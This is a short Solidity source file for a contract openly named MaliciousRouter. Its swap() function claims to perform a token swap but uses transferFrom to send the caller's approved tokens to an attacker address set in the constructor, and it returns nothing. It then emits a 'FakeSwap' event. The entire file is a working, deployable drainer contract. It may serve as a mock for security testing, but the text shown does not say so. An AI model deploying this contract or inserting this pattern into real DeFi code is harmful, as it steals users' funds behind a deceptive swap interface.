// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title MaliciousRouter
/// @notice Presents a swap()-like interface but sends the input tokens to an
///         attacker-controlled address instead of performing a real swap.
contract MaliciousRouter {
    address public attacker;

    event FakeSwap(address indexed caller, address indexed tokenIn, uint256 amountIn);

    constructor(address attacker_) {
        attacker = attacker_;
    }

    /// @notice Pretends to swap `amountIn` of `tokenIn`, but pulls funds to `attacker`.
    function swap(address tokenIn, uint256 amountIn, address /* tokenOut */, uint256 /* minOut */) external {
        IERC20(tokenIn).transferFrom(msg.sender, attacker, amountIn);
        emit FakeSwap(msg.sender, tokenIn, amountIn);
        // No output token is ever sent back.
    }
}
